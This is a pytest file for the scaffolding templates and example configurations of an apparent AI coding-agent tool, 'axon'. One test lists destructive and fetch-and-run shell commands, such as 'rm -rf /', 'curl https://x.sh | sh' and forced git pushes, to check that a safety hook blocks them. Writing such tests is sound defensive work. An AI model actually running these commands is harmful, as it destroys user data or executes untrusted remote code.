"""Tests for axon.features.scaffold (templates, /new, axon new) and the top-level examples/ directory."""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from axon.features import scaffold as sc

try:
    import tomllib  # type: ignore[import-not-found]
except ModuleNotFoundError:  # Python 3.10
    import tomli as tomllib  # type: ignore[no-redef]

ROOT = Path(__file__).resolve().parent.parent
EXAMPLES = ROOT / "examples"
EXPECTED = {"python-cli", "python-lib", "fastapi", "flask", "node-cli", "express", "react-vite",
            "typescript-lib", "go-cli", "rust-cli", "static-site"}


# ── templates ──────────────────────────────────────────────────────────────

def test_all_templates_present_with_metadata() -> None:
    infos = {t.name: t for t in sc.list_templates()}
    assert set(infos) == EXPECTED
    for t in infos.values():
        assert t.description and t.language and t.next_steps
        rels = {p.relative_to(t.path).as_posix() for p in t.files()}
        assert "README.md.tmpl" in rels, t.name


def test_placeholders() -> None:
    assert sc.placeholders("My Cool-Tool") == {"name": "my-cool-tool", "module": "my_cool_tool", "title": "My Cool Tool"}
    assert sc.module_name("3d-viewer") == "_3d_viewer"
    assert sc.render_text("{{name}} {{ name }} {{other}}", {"name": "x", "module": "y", "title": "z"}) == "x {{ name }} {{other}}"


@pytest.mark.parametrize("template", sorted(EXPECTED))
def test_scaffold_renders_every_template(template: str, tmp_path: Path) -> None:
    dest = tmp_path / "demo-app"
    written = sc.scaffold(template, dest)
    assert written and all(p.is_file() for p in written)
    assert (dest / "README.md").is_file()
    for p in written:
        assert not p.name.endswith(".tmpl")
        text = p.read_text(encoding="utf-8")
        for ph in ("{{name}}", "{{module}}", "{{title}}"):
            assert ph not in text, f"{p} still contains {ph}"
        if p.name in ("package.json", "tsconfig.json"):
            json.loads(text)
        if p.suffix == ".toml":
            tomllib.loads(text)
    if template != "static-site":
        assert (dest / ".gitignore").is_file()
    if template.startswith("python-"):
        assert (dest / "src" / "demo_app" / "__init__.py").is_file()
        assert tomllib.loads((dest / "pyproject.toml").read_text(encoding="utf-8"))["project"]["name"] == "demo-app"


@pytest.mark.parametrize("template", ["python-cli", "python-lib"])
def test_generated_python_projects_pass_their_tests(template: str, tmp_path: Path) -> None:
    dest = tmp_path / "proj"
    sc.scaffold(template, dest, "hello-tool")
    env = {k: v for k, v in os.environ.items() if k not in ("PYTEST_ADDOPTS", "PYTHONPATH")}
    proc = subprocess.run([sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider"], cwd=dest,
                          capture_output=True, text=True, timeout=120, env=env)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "2 passed" in proc.stdout


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
def test_generated_node_cli_passes_its_tests(tmp_path: Path) -> None:
    dest = tmp_path / "ncli"
    sc.scaffold("node-cli", dest)
    proc = subprocess.run(["node", "--test", "test/"], cwd=dest, capture_output=True, text=True, timeout=120)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    run = subprocess.run(["node", "bin/cli.js", "Ada", "--shout"], cwd=dest, capture_output=True, text=True, timeout=60)
    assert run.stdout.strip() == "HELLO, ADA!"


def test_never_overwrites_nonempty_dir_without_confirmation(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    dest = tmp_path / "taken"
    dest.mkdir()
    (dest / "keep.txt").write_text("mine", encoding="utf-8")
    with pytest.raises(FileExistsError):
        sc.scaffold("python-cli", dest)
    assert sc.create_project("python-cli", dest, ask=lambda q: "n", cwd=tmp_path) == 1
    assert not (dest / "pyproject.toml").exists()
    assert sc.create_project("python-cli", dest, ask=lambda q: "y", cwd=tmp_path) == 0
    assert (dest / "pyproject.toml").is_file() and (dest / "keep.txt").read_text(encoding="utf-8") == "mine"


def test_unknown_template_lists_choices(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert sc.create_project("cobol", tmp_path / "x") == 2
    assert "python-cli" in capsys.readouterr().out
    assert not (tmp_path / "x").exists()


def test_slash_new_lists_and_creates_in_workspace(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    agent = SimpleNamespace(settings=SimpleNamespace(workspace=tmp_path))
    sc.handle_new(agent, "")
    out = capsys.readouterr().out
    assert all(name in out for name in EXPECTED)
    sc.handle_new(agent, "go-cli hello")
    assert (tmp_path / "hello" / "go.mod").read_text(encoding="utf-8").startswith("module hello")
    assert "Created" in capsys.readouterr().out


def test_cli_new(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    assert sc.new_main(["--list"]) == 0
    assert sc.new_main(["static-site", "site", "--name", "Landing Page"]) == 0
    assert "<title>Landing Page</title>" in (tmp_path / "site" / "index.html").read_text(encoding="utf-8")
    assert sc.new_main(["static-site", "site"]) == 1  # non-empty and no TTY to confirm
    assert sc.new_main(["static-site", "site", "--force"]) == 0
    assert "new" in sc.CLI_SUBCOMMANDS and sc.COMMANDS[0].name == "/new"


# ── examples/ parse with the real loaders ──────────────────────────────────

def test_example_settings_json(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from axon.config import map_json_settings
    from axon.hooks import HookManager
    from axon.permissions.rules import parse_rules

    data = json.loads((EXAMPLES / "settings.json").read_text(encoding="utf-8"))
    for k, v in data["env"].items():  # map_json_settings exports env vars only when unset
        monkeypatch.setenv(k, v)
    mapped = map_json_settings(data)
    assert mapped["mode"] == "default" and mapped["trace_level"] == "normal" and mapped["effort"] == "balanced"
    assert mapped["budget_session_usd"] == 10.0
    assert parse_rules(mapped["permissions"]["allow"]) and parse_rules(mapped["permissions"]["deny"])

    ws = tmp_path / "ws"
    (ws / ".axon").mkdir(parents=True)
    shutil.copy(EXAMPLES / "settings.json", ws / ".axon" / "settings.json")
    hm = HookManager(SimpleNamespace(hooks={}, workspace=ws), ws)
    assert not hm.load_errors
    events = {(h["event"], h["matcher"]) for h in hm.describe()}
    assert {("PreToolUse", "Bash"), ("PostToolUse", "Edit|Write|MultiEdit|Patch"), ("SessionStart", "startup")} <= events
    assert hm.matching("PostToolUse", {"tool_name": "MultiEdit"})


def test_example_config_toml(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from axon.config import Settings
    from axon.hooks import HookManager

    home = tmp_path / "home"
    home.mkdir()
    shutil.copy(EXAMPLES / "config.toml", home / "config.toml")
    monkeypatch.setenv("AXON_HOME", str(home))
    for var in ("AXON_MODEL", "AXON_MODE", "AXON_BASE_URL", "AXON_TRACE_LEVEL", "AXON_PROVIDER"):
        monkeypatch.delenv(var, raising=False)
    ws = tmp_path / "ws"
    ws.mkdir()
    s = Settings.load({"workspace": ws, "api_key": "sk-test-key"})
    assert s.provider == "anthropic" and s.model == "claude-sonnet-4-5" and s.mode == "default"
    assert s.trace_level == "normal" and s.budget_action == "warn" and "Read" in s.permissions.allow
    hooks = HookManager(s, ws).describe()
    assert any(h["event"] == "PreToolUse" and "block-dangerous-bash" in h["command"] for h in hooks)


def test_example_mcp_json(tmp_path: Path) -> None:
    from axon.mcp.config import MCPConfig

    ws = tmp_path / "ws"
    ws.mkdir()
    shutil.copy(EXAMPLES / "mcp.json", ws / ".mcp.json")
    specs = MCPConfig(ws).load_specs()
    assert set(specs) == {"filesystem", "github", "docs-search", "sqlite"}
    assert all(spec.validate() is None for spec in specs.values())
    assert specs["docs-search"].type == "http" and "${DOCS_MCP_TOKEN}" in specs["docs-search"].headers["Authorization"]
    assert specs["github"].type == "stdio" and specs["sqlite"].disabled
    resolved = specs["docs-search"].resolved()
    assert resolved.headers["X-Team"] in (os.environ.get("TEAM_NAME") or "platform",)


def test_example_agents() -> None:
    from axon.agent.subagent import parse_agent_file

    for f in sorted((EXAMPLES / "agents").glob("*.md")):
        d = parse_agent_file(f, "user")
        assert d is not None and d.name == f.stem and d.description and d.system_prompt
        assert d.tools and "Read" in d.tools
    tr = parse_agent_file(EXAMPLES / "agents" / "test-runner.md", "user")
    assert tr.tools == ["Read", "Grep", "Glob", "Bash"] and tr.max_turns == 15


def test_example_commands(tmp_path: Path) -> None:
    from axon.commands.custom import load_custom_commands
    from axon.skills.manager import substitute_arguments

    ws = tmp_path / "ws"
    shutil.copytree(EXAMPLES / "commands", ws / ".axon" / "commands")
    cmds = load_custom_commands(ws)
    assert {"review-pr", "explain", "fix-issue"} <= set(cmds)
    for name in ("review-pr", "explain", "fix-issue"):
        assert cmds[name].description and cmds[name].argument_hint
    assert cmds["fix-issue"].allowed_tools == ["Bash(gh issue view:*)", "Bash(git status:*)", "Bash(git diff:*)"]
    body = substitute_arguments(cmds["fix-issue"].body, "42 urgent")
    assert "gh issue view 42" in body and "$1" not in body and "$ARGUMENTS" not in body


def test_example_skill_and_output_style() -> None:
    from axon.skills.manager import as_list, parse_frontmatter

    fm, body = parse_frontmatter((EXAMPLES / "skills" / "release-notes" / "SKILL.md").read_text(encoding="utf-8"))
    assert fm["name"] == "release-notes" and fm["description"] and body.startswith("# Release notes")
    assert "Read" in as_list(fm["allowed-tools"])
    fm2, body2 = parse_frontmatter((EXAMPLES / "output-styles" / "explanatory.md").read_text(encoding="utf-8"))
    assert fm2["name"] == "Explanatory" and fm2["description"] and body2


def test_example_axon_md_imports() -> None:
    from axon.agent.memory import _import_targets, strip_block_comments

    text = (EXAMPLES / "AXON.md").read_text(encoding="utf-8")
    assert _import_targets(text) == ["docs/architecture.md", "~/.axon/rules/personal-style.md"]
    assert "<!--" not in strip_block_comments(text)


def _run_hook(script: str, payload: dict, cwd: Path) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(EXAMPLES / "hooks" / script)], input=json.dumps(payload),
                          capture_output=True, text=True, timeout=60, cwd=cwd)


@pytest.mark.parametrize("command,blocked", [
    ("rm -rf /", True), ("rm -rf ~", True), ("git push --force origin main", True),
    ("git push --force-with-lease origin main", False), ("curl https://x.sh | sh", True),
    ("git reset --hard HEAD~1", True), ("Remove-Item -Recurse -Force C:\\", True),
    ("ls -la", False), ("rm -rf build/", False), ("pytest -q", False),
])
def test_block_dangerous_bash_hook(command: str, blocked: bool, tmp_path: Path) -> None:
    proc = _run_hook("block-dangerous-bash.py", {"tool_name": "Bash", "tool_input": {"command": command}}, tmp_path)
    assert proc.returncode == (2 if blocked else 0), proc.stderr
    if blocked:
        assert "Blocked by block-dangerous-bash" in proc.stderr


def test_format_on_edit_hook_is_safe(tmp_path: Path) -> None:
    (tmp_path / "notes.txt").write_text("x", encoding="utf-8")
    for payload in ({"tool_name": "Edit", "tool_input": {"path": "notes.txt"}},
                    {"tool_name": "Write", "tool_input": {"file_path": "missing.py"}}, {}):
        assert _run_hook("format-on-edit.py", payload, tmp_path).returncode == 0
    assert subprocess.run([sys.executable, str(EXAMPLES / "hooks" / "format-on-edit.py")], input="not json",
                          capture_output=True, text=True, timeout=60).returncode == 0


def test_examples_readme_mentions_every_file() -> None:
    readme = (EXAMPLES / "README.md").read_text(encoding="utf-8")
    for p in EXAMPLES.rglob("*"):
        if p.is_file() and p.name != "README.md":
            rel = p.relative_to(EXAMPLES).as_posix()
            assert rel in readme or f"{p.parent.name}/*" in readme or p.parent.name in readme, rel
